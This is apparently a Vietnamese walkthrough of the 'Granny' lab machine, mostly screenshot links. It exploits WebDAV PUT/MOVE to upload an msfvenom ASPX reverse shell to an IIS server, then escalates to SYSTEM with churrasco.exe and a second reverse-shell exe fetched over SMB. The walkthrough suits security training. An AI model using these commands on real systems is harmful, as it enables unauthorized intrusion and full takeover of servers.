# Granny-windows

- liệt kê

![https://lh7-us.googleusercontent.com/h2-Dv95J06orQLeC-bL4TnYGoTCiUmTa2dvrZ7YevwRN_Klcnr_Zs56IX32n8qPEdEjv9oymZ2T2BK8zkznbdCVlzpP_YZJXvZHlmg3uqAIB7RM3R6Hal2VZp6an8qXmu_mfHUbUmlj9](https://lh7-us.googleusercontent.com/h2-Dv95J06orQLeC-bL4TnYGoTCiUmTa2dvrZ7YevwRN_Klcnr_Zs56IX32n8qPEdEjv9oymZ2T2BK8zkznbdCVlzpP_YZJXvZHlmg3uqAIB7RM3R6Hal2VZp6an8qXmu_mfHUbUmlj9)

path ẩn, ko thấy gì khả nghi

![https://lh7-us.googleusercontent.com/nVFg1hdOnP5IBeA9qty0xJykD8hcTbdU5RNMUuU6zLQVs2PwfmdQzBP-Uxq7w8UVBGK92zCOgNhCLqGq1Ka2FqhOvSVlsHxV7001bJ7aYbJZdXY2ibZ7YVgty8Akyfv5p4xMWx-foyVo](https://lh7-us.googleusercontent.com/nVFg1hdOnP5IBeA9qty0xJykD8hcTbdU5RNMUuU6zLQVs2PwfmdQzBP-Uxq7w8UVBGK92zCOgNhCLqGq1Ka2FqhOvSVlsHxV7001bJ7aYbJZdXY2ibZ7YVgty8Akyfv5p4xMWx-foyVo)

truy cập p80 -> ko có web page

từ kết quả nmap thấy PUT method allowed -> có khả năng lưu file trên web server ~ upload file

ở Microsoft IIS web server, loại file thực thi là  ASP and ASPX

kiểm tra các đuôi file được phép upload:

davtest --url http://10.10.10.15

![https://lh7-us.googleusercontent.com/dKJgJkESWHZZ-aZSSf8IlkHiKJKTyEKNo1O4lgF7nSKTip5F6CpV4CwKHL9ills68MxwC73UoxTMFYePk3zD2xQif9YcmTXNH1rHY88wMd17fJqkrwUbSWvJkrY9AANh15ao_RKCXFLT](https://lh7-us.googleusercontent.com/dKJgJkESWHZZ-aZSSf8IlkHiKJKTyEKNo1O4lgF7nSKTip5F6CpV4CwKHL9ills68MxwC73UoxTMFYePk3zD2xQif9YcmTXNH1rHY88wMd17fJqkrwUbSWvJkrY9AANh15ao_RKCXFLT)

![https://lh7-us.googleusercontent.com/30Xz0p1a1SqgNYrANQNllfDzEPzHMzj2e7148rHFUCxm3UY6Cez0SuP7bSLioD_mMlAypg4QqtBbfDv9XXWmNccnSIiPQxSbBVYdM8oWN9-3e70VbNisiENhqzapdlsmCvczDgynlChw](https://lh7-us.googleusercontent.com/30Xz0p1a1SqgNYrANQNllfDzEPzHMzj2e7148rHFUCxm3UY6Cez0SuP7bSLioD_mMlAypg4QqtBbfDv9XXWmNccnSIiPQxSbBVYdM8oWN9-3e70VbNisiENhqzapdlsmCvczDgynlChw)

cả asp và aspx đều not allowed, nhưng txt và html thì đc

MOVE method có thể thay đổi vị trí file hoặc rename

thử upload .html và đổi thành .aspx

curl -X PUT http://10.10.10.15/test.aspx.html -d @test.aspx.html

![https://lh7-us.googleusercontent.com/7F_kayCcsyWfVuWWwKwCoA4HUKhEzCji6_U8HZ9ESxsYNbzp5LIo4SQ5dCFfH7kyiKtwAFy2omHWJbJSrMEElTZz-c_mgjfW2AgVDQKMH7lGAMZF2oiSEoPz1Io_6RVBr8YtoxjreqT8](https://lh7-us.googleusercontent.com/7F_kayCcsyWfVuWWwKwCoA4HUKhEzCji6_U8HZ9ESxsYNbzp5LIo4SQ5dCFfH7kyiKtwAFy2omHWJbJSrMEElTZz-c_mgjfW2AgVDQKMH7lGAMZF2oiSEoPz1Io_6RVBr8YtoxjreqT8)

- curl -X MOVE --header 'Destination:http://10.10.10.15/test.aspx' 'http://10.10.10.15/test.aspx.html'
- curl http://10.10.10.15/test.aspx

![https://lh7-us.googleusercontent.com/b6wEXvbAuWUgTJSaCWRQxXjy0upME1CgZd8L0wQjzt1axHzeHeHaZ6Y8Gja7fc1pMlqylov8mh5vQ8emmFs6sabLLzHCcxn5RdQy8veMjlTR6geGeUD28s8FqcpdU0uqhSUUqC038ekw](https://lh7-us.googleusercontent.com/b6wEXvbAuWUgTJSaCWRQxXjy0upME1CgZd8L0wQjzt1axHzeHeHaZ6Y8Gja7fc1pMlqylov8mh5vQ8emmFs6sabLLzHCcxn5RdQy8veMjlTR6geGeUD28s8FqcpdU0uqhSUUqC038ekw)

tạo payload format aspx để reverse shell dùng netcat:

msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.21 LPORT=1234 -o shell.aspx.html

![https://lh7-us.googleusercontent.com/76lMTPsRy5pJn3AusIYJvsFv8o6BUVs7qBdD4ndlLCNavKGjjXMa_YVWXzaZ61bqGBoL6EJRcTtj0V8TWpQTWWnYrQ7D9XDc7mZ9qsJBja7LKSrb49e1GHv_44oICUZa3boBjtZ0EkJe](https://lh7-us.googleusercontent.com/76lMTPsRy5pJn3AusIYJvsFv8o6BUVs7qBdD4ndlLCNavKGjjXMa_YVWXzaZ61bqGBoL6EJRcTtj0V8TWpQTWWnYrQ7D9XDc7mZ9qsJBja7LKSrb49e1GHv_44oICUZa3boBjtZ0EkJe)

- curl -X PUT http://10.10.10.15/shell.aspx.html --data-binary @shell.aspx.html
- curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx.html' 'http://10.10.10.15/shell.aspx.html'

![https://lh7-us.googleusercontent.com/NQ7lzG0JaPlXD68omBpe-Ey3wdTOTR8iiyzyWxbuApZvhTtGeWiodppl9A1miSALOso9ccqoqiPp-MZd-ZlXKUOKidhcm_oOjiXNk0yGxU3tN4GwOzuFhwecxkyCDAW_6ImhM78DJlXC](https://lh7-us.googleusercontent.com/NQ7lzG0JaPlXD68omBpe-Ey3wdTOTR8iiyzyWxbuApZvhTtGeWiodppl9A1miSALOso9ccqoqiPp-MZd-ZlXKUOKidhcm_oOjiXNk0yGxU3tN4GwOzuFhwecxkyCDAW_6ImhM78DJlXC)

nhưng ko đc quyền truy cập

![https://lh7-us.googleusercontent.com/SEwaJ9eQjLTDlfhmAC3ilkjo-p6iNv7c2jbOUxeNjJEax_Wq3WN8AYA3_LWdFtfpAcqagPk8rQZroneZfTh6WXdpqQ_UuhO8m-EEFJn3_zw2bUvWfXuNPxy-VMetuT4eqmIc66-NALOE](https://lh7-us.googleusercontent.com/SEwaJ9eQjLTDlfhmAC3ilkjo-p6iNv7c2jbOUxeNjJEax_Wq3WN8AYA3_LWdFtfpAcqagPk8rQZroneZfTh6WXdpqQ_UuhO8m-EEFJn3_zw2bUvWfXuNPxy-VMetuT4eqmIc66-NALOE)

![https://lh7-us.googleusercontent.com/eZRQAa3E84mSW9f-9ENlYdft2f7Km2owiKDLjbETnOUSWZBMJJ5-6HCvDSWhhfGrXy4aegsVsGSNRpApZZ57yE-2a0qXg6FgCBJgiAnH8eZSgaJSoMx-unTD8Rk29NFzL0BOI2fvzImX](https://lh7-us.googleusercontent.com/eZRQAa3E84mSW9f-9ENlYdft2f7Km2owiKDLjbETnOUSWZBMJJ5-6HCvDSWhhfGrXy4aegsVsGSNRpApZZ57yE-2a0qXg6FgCBJgiAnH8eZSgaJSoMx-unTD8Rk29NFzL0BOI2fvzImX)

lỗ hổng trước hết tồn tại trong Microsoft Distributed Transaction Coordinator(MSDTC). MSDTC để lại mã thông báo NetworkService có thể bị mạo danh~ impersonated (có nghĩa là nó sẽ chạy với các đặc quyền và quyền của mã thông báo đó) bởi bất kỳ quy trình nào gọi vào nó. Có nghĩa là lỗ hổng này cho phép một quy trình không chạy trong tài khoản NetworkService nhưng có SeImpersonatePrivilege để nâng cao đặc quyền của nó và do đó thực thi mã trong đặc quyền NetworkService.

![https://lh7-us.googleusercontent.com/6DOOAi02jUP_02nB4_KIgy0erM5raB597egTjhwZ4gxv2cr8RZ7itT53WSKZ_oT0oL3YoKT1FABOU3D4TU6bUpMa7yQVptAy7wwU7aRiEXAEUGbK2jYR9Pg5pbmI6P0aBoXORRCwbNE2](https://lh7-us.googleusercontent.com/6DOOAi02jUP_02nB4_KIgy0erM5raB597egTjhwZ4gxv2cr8RZ7itT53WSKZ_oT0oL3YoKT1FABOU3D4TU6bUpMa7yQVptAy7wwU7aRiEXAEUGbK2jYR9Pg5pbmI6P0aBoXORRCwbNE2)

dùng  churrasco để pe

execute churrasco.exe to kidnap the tokens and give us a nt authority\system shell.

đưa churrasco sang target

impacket-smbserver share . -smb2support

net view \\10.10.14.21

![https://lh7-us.googleusercontent.com/gcniwYVF9CeayDYB3MoIs3ro9iBlbT1wWax5K1UFAS6xWz6TqcvpOGZeQGTYxbuQpS6YSpJf99uS-Ovmx7BAO6QY_P4M17fK1gw7t-ugikvac8xSgd2mr0gxAPN8GvcBg-K-i4E6ywtT](https://lh7-us.googleusercontent.com/gcniwYVF9CeayDYB3MoIs3ro9iBlbT1wWax5K1UFAS6xWz6TqcvpOGZeQGTYxbuQpS6YSpJf99uS-Ovmx7BAO6QY_P4M17fK1gw7t-ugikvac8xSgd2mr0gxAPN8GvcBg-K-i4E6ywtT)

![https://lh7-us.googleusercontent.com/jAvG6xC4lJujRVtEeGiiUgkPG9X0Gcl6OCtH9G8av_xxpQiZJBO9JqQK4pxOolQecHxyBWNgZK_geUQiie97l17a0WPOKoh41UP-O8n2zZOd27d3W7OCkPlMeBU6Eb_y2RXbm3X-AbQp](https://lh7-us.googleusercontent.com/jAvG6xC4lJujRVtEeGiiUgkPG9X0Gcl6OCtH9G8av_xxpQiZJBO9JqQK4pxOolQecHxyBWNgZK_geUQiie97l17a0WPOKoh41UP-O8n2zZOd27d3W7OCkPlMeBU6Eb_y2RXbm3X-AbQp)

copy \\10.10.14.21\share\churrasco.exe

![https://lh7-us.googleusercontent.com/aSOmniY1AvvFGmmbsXZN9qo7O1XlyL3Ewnv-yFfIwgfxe4uyuOnGkfTVOEoeItaigBa_WP-pQ--3QcSJvFFeV__VQX-QS5Xd8UEVy8Avsy4oTl9sUt0o7olqU8SrsE43gzdaObyIwrNs](https://lh7-us.googleusercontent.com/aSOmniY1AvvFGmmbsXZN9qo7O1XlyL3Ewnv-yFfIwgfxe4uyuOnGkfTVOEoeItaigBa_WP-pQ--3QcSJvFFeV__VQX-QS5Xd8UEVy8Avsy4oTl9sUt0o7olqU8SrsE43gzdaObyIwrNs)

dùng metasploit để netcat lấy shell system

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.21 LPORT=4433 -f exe -o revshell.exe

![https://lh7-us.googleusercontent.com/1BhSKssEP06Jkr7hDdax2Ll6bNK79RK4UlpFDXuG5iKV9A2ppM3P9aLod1rWhTrHXEp3QXIdQuJs8DiNtbCivMKtWvnb-7I3LvfWVE1MgU2tYoqepOMyGFAZP5hYe9d4VAQeFfIouOYt](https://lh7-us.googleusercontent.com/1BhSKssEP06Jkr7hDdax2Ll6bNK79RK4UlpFDXuG5iKV9A2ppM3P9aLod1rWhTrHXEp3QXIdQuJs8DiNtbCivMKtWvnb-7I3LvfWVE1MgU2tYoqepOMyGFAZP5hYe9d4VAQeFfIouOYt)

đưa payload reverse shell sang target

![https://lh7-us.googleusercontent.com/klBY3JFNuYxYUtbARY9YaxLbDVlZbu_j1Z7E9wlb7y-Yw23ZoSBC5zGCSZphYBNc1gnf9LyWAPi3cH1FgjD_T8UZT2bUGjCoWHpvGFiFt8G70UheQPQ99HIh52l5qsAXsTk-etsX92lO](https://lh7-us.googleusercontent.com/klBY3JFNuYxYUtbARY9YaxLbDVlZbu_j1Z7E9wlb7y-Yw23ZoSBC5zGCSZphYBNc1gnf9LyWAPi3cH1FgjD_T8UZT2bUGjCoWHpvGFiFt8G70UheQPQ99HIh52l5qsAXsTk-etsX92lO)

netcat 4433

thực thi

![https://lh7-us.googleusercontent.com/cP6WnDXsVgVpFFV4PAyO-aGe_k3WxWimCODugKwd4QXwE2Tsf-I7_TilepgF_JOV8Y-b3ZfcbWEGly9osqhGEf_idIk3ubCgGlhLI273m_uPv_kPfZ3r20L6e5hVw0V7gyGdvQQQqCiy](https://lh7-us.googleusercontent.com/cP6WnDXsVgVpFFV4PAyO-aGe_k3WxWimCODugKwd4QXwE2Tsf-I7_TilepgF_JOV8Y-b3ZfcbWEGly9osqhGEf_idIk3ubCgGlhLI273m_uPv_kPfZ3r20L6e5hVw0V7gyGdvQQQqCiy)

có quyền system

![https://lh7-us.googleusercontent.com/qfzOm71SRNUFqJ9gHgSwEuf-1a9yFE34VNvKZEC54FKppvWQlIBG5AHMnnFC-M0DmMxxIsU6la2roYAlBoRZtROiGsIZykNU8DLXVPAizOD6oEYXy7OpSUVdkKA61gOe-bQUgLmuxiNr](https://lh7-us.googleusercontent.com/qfzOm71SRNUFqJ9gHgSwEuf-1a9yFE34VNvKZEC54FKppvWQlIBG5AHMnnFC-M0DmMxxIsU6la2roYAlBoRZtROiGsIZykNU8DLXVPAizOD6oEYXy7OpSUVdkKA61gOe-bQUgLmuxiNr)

![https://lh7-us.googleusercontent.com/jtgZpv_VI0J-pddalEs3ok8c_UYQXm6PSUewCdCb-PqQnEN5syyimDjpuhowJAi5O9TxXVyF7dj_E5HuYs4d__E1GJ1Gv8DvXjqte5HazdUzk5t4ZCbkYK31oNoimGUeMOuH_ij1iS_D](https://lh7-us.googleusercontent.com/jtgZpv_VI0J-pddalEs3ok8c_UYQXm6PSUewCdCb-PqQnEN5syyimDjpuhowJAi5O9TxXVyF7dj_E5HuYs4d__E1GJ1Gv8DvXjqte5HazdUzk5t4ZCbkYK31oNoimGUeMOuH_ij1iS_D)

![https://lh7-us.googleusercontent.com/RuzhM31Ul5NmpF77D228Z_lWZPGRbgZ_Y-duOE2X3rXU3MoFE9exbSu6maVpQMFbqIyodrDSxivt8iUuPtwLSIPzrm5DlRMxt5Sit66_FQahyAgvG3eGN9V1xft5Zoyt0qmQMK-pGY9z](https://lh7-us.googleusercontent.com/RuzhM31Ul5NmpF77D228Z_lWZPGRbgZ_Y-duOE2X3rXU3MoFE9exbSu6maVpQMFbqIyodrDSxivt8iUuPtwLSIPzrm5DlRMxt5Sit66_FQahyAgvG3eGN9V1xft5Zoyt0qmQMK-pGY9z)